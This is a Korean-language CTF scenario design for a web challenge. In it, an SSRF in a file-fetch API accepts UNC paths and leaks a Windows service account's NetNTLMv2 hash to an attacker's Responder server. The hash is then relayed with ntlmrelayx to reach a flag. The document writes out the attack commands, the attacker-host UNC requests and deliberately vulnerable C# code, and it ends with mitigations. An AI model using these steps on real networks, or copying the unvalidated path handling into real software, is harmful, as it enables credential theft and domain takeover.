---
title: SSRF via NetNTLM Hash Leak and Relay Attack — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, ssrf, ntlm-relay, active-directory, smb, hash-leak, internal-network]
confidence: high
---

# SSRF via NetNTLM Hash Leak and Relay Attack — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Windows Domain Resource Fetcher (도메인 리소스 연동 센터)
- **난이도**: High
- **핵심 컨셉**: Active Directory(AD) 기반의 Windows 내부망 환경과 인접한 리눅스/윈도우 웹 애플리케이션의 SSRF 지점을 공략해 해시를 탈취하는 **NetNTLM Hash Leak & Relay** 취약점 문제입니다. 대상 애플리케이션은 파트너사 시스템 리소스를 공유하기 위해 주소 링크(`?path=...`)를 수신하고 접근하는 기능을 제공합니다. 공격자는 단순 HTTP 주소가 아닌 윈도우 파일 시스템 네트워크 경로 명세인 **UNC 경로(예: `\\attacker.local\share`)** 또는 **`file://` / `smb://` 프로토콜**을 주입합니다. 이를 통해 웹 서버가 공격자가 제어하는 외부 모의 SMB 서버로 접속하도록 유도하고, Windows 계정 인증 과정에서 자발적으로 송출하는 **NetNTLM 인증 해시(Hash)**를 강제 탈취한 뒤 이를 다른 사설 도메인 시스템에 릴레이(Relay)하여 도메인 어드민 제어권을 탈취합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Internal Fetcher API (`/api/fetch`)**:
  - 파일 다운로드 및 아카이브 조회를 담당하며, 백엔드 서비스 계정이 Windows 도메인 권한을 탑재한 상태로 구동 중.
- **Attacker Rogue SMB Server (Responder)**:
  - 공격자가 내부망 대역 내에서 셋업한 NTLM 인증 챌린지 수집 및 릴레이용 서버(Responder, ntlmrelayx).
- **Flag 위치**:
  - AD 도메인 컨트롤러(Domain Controller)의 C드라이브 백업 디렉터리 내부 혹은 릴레이 인증이 통과된 내부 SMB 공유 스토리지(`/share/flag.txt`) 안.

### 2.2 취약점 지점
1. **Unrestricted Fetch URI Protocol**:
   - 백엔드 주소 유효성 검사에서 `http://` 또는 `https://` 프로토콜 확인 검증을 생략하거나, 윈도우 파일 API(`File.ReadAllBytes` 등)의 자동 파일 경로 파싱 특성으로 인해 UNC 주소(`\\`로 시작하는 네트워크 드라이브 경로) 처리가 그대로 수락됩니다.
2. **Automatic Windows Authentication (SSO / NTLM handshake)**:
   - 윈도우 OS 위에서 백엔드가 구동 중일 때 외부 SMB 자원에 연결하려고 시도하면, OS 내부의 LSASS 보안 모듈은 자동으로 현재 백엔드 기동용 도메인 사용자 계정의 자격 증명을 암호화한 NetNTLM v1/v2 해시 형태의 핸드셰이크를 대상 호스트에 송출하는 통합 싱글사인온(SSO) 메커니즘이 동작합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | 허용 주입 포맷 | 핵심 위협 |
|------------|--------|------|----------|----------------|-----------|
| `/api/fetch` | GET | 불필요 | `path` | `\\attacker-ip\share` / `file://` | Windows 시스템 계정 NetNTLM 해시 강제 유출 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. UNC 경로 수용 여부 진단
1. 파일 로딩 기능 파라미터에 로컬 주소를 넣어 봅니다: `/api/fetch?path=C:\Windows\win.ini` (윈도우 파일 시스템이 반응함을 확인)
2. 네트워크 UNC 파일 경로를 가리키도록 설정하여 외부 서버 커넥션을 받아내는지 봅니다:
   `path=\\10.10.10.50\nonexistent` (공격자 모니터링 IP: `10.10.10.50`)
3. 공격자 서버로 TCP 445 (SMB) 포트 접속 시도가 도킹되어 오는 것을 확인하고 SSRF UNC 매핑 취약점을 인지합니다.

### Step 2. Responder를 이용한 NetNTLM 해시 덤프
1. 공격자는 동일 서브넷 대역 내에 Responder 도구를 기동하여 Rogue SMB Server 모드를 셋업합니다.
   `sudo responder -I eth0 -rdv`
2. 대상 웹 앱으로 UNC SSRF 공격 링크를 트리거합니다.
   `/api/fetch?path=\\10.10.10.50\share\exploit.txt`
3. 타겟 윈도우 웹 서버의 자바/ASP.NET 프로세스는 파일 열기를 위해 `10.10.10.50` SMB 공유를 참조하려 하고, 챌린지 응답 인증을 진행합니다.
4. Responder가 계정(예: `DOM\svc-webserver`)의 NetNTLMv2 해시 캡처에 성공합니다.
   - **캡처된 해시 예시**:
     `svc-webserver::DOM:112233445566...:d1d2d3d4...`

### Step 3. NTLM Relay 공격 실행 (ntlmrelayx)
만약 NTLMv2 해시의 사전 크래킹 패스워드가 매우 길어 오프라인 크래킹이 어렵다면, 실시간 인증 릴레이 도구(`impacket-ntlmrelayx`)를 구동하여 권한을 전이합니다.
1. SMB 서명이 비활성화되어 있는 사설망 대역 내 다른 자산 서버(예: DB 서버 `10.10.10.100`)를 타겟으로 지정합니다.
   `impacket-ntlmrelayx -t smb://10.10.10.100 -smb2support`
2. 다시 포털의 SSRF 트리거 경로로 `/api/fetch?path=\\10.10.10.50\share` 요청을 발송합니다.
3. 들어온 NTLMv2 인증 요청 세션을 `ntlmrelayx`가 `10.10.10.100` 서버로 전달(Relay)하여, 해당 서버의 파일 및 시스템 SAM 데이터 권한을 강제로 통과시킵니다.

### Step 4. flag 획득
1. 릴레이 성공으로 획득한 `10.10.10.100` SMB 공유 파일 시스템 권한을 통해 플래그 파일 조회를 명령어로 내려보냅니다.
2. 다운로드된 파일(`/share/flag.txt` 등) 내용을 뷰잉하여 플래그(`FLAG{ssrf_ntlm_relay_active_directory_domain_hijacking}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (C# ASP.NET Core)

```csharp
// FetchController.cs (취약한 UNC 경로 파일 읽기 예시)
using System;
using System.IO;
using Microsoft.AspNetCore.Mvc;

namespace WebChallenge.Controllers
{
    [ApiController]
    [Route("api/[controller]")]
    public class FetchController : ControllerBase
    {
        [HttpGet]
        public IActionResult GetFile([FromQuery] string path)
        {
            if (string.IsNullOrEmpty(path))
            {
                return BadRequest("Path parameter is missing.");
            }

            try
            {
                // 취약점 지점 1: http/https 도메인 외에 UNC 경로(\\ip\share)에 대한 차단 검증이 없음
                // 취약점 지점 2: File.ReadAllBytes에 들어오는 경로에 따라 OS가 자동으로 
                // 외부 네트워크 호스트로 SMB 인증(NetNTLM 송출) 시도를 감행함
                byte[] fileBytes = System.IO.File.ReadAllBytes(path);
                return File(fileBytes, "application/octet-stream");
            }
            catch (Exception ex)
            {
                return StatusCode(500, $"Internal error: {ex.Message}");
            }
        }
    }
}
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **SMB 아웃바운드 포트 및 프로토콜 통제 (Block Outbound SMB)**:
   - 서버 호스트 수준의 방화벽(Windows Firewall/iptables) 설정에서 외부 비인가 대역으로 향하는 TCP 139 및 445 (SMB) 포트의 아웃바운드 나가는 통신 트래픽을 차단합니다.
2. **엄격한 URI 프로토콜 스키마 및 호스트 제한**:
   - 수신되는 `path` 파라미터가 정확히 지정된 호스트 범위를 가지는지 문자열 검사를 기동하고, 백슬래시(`\`) 기호로 시작하는 UNC 주소 형식을 사전 기각합니다.
3. **SMB 서명 강제 활성화 (Require SMB Signing)**:
   - 도메인 컨트롤러 및 사내 AD 인프라 대역 내 모든 컴퓨터 자산에 `Require SMB Security Signatures` (SMB Signing) 그룹 정책을 강제 활성화하여, 가로챈 NTLM 해시 세션을 그대로 릴레이하여 재사용하는 릴레이 공격 시도를 원천 무효화합니다.
